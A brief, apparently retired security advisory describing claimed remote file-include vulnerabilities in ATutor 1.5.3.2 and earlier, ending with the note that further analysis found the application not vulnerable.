ATutor is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.

A successful exploit of these issues allows an attacker to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.

ATutor 1.5.3.2 and prior versions are vulnerable to these issues; other versions may also be affected.

This BID is being retired; further analysis reveals that the application is not vulnerable to this issue.
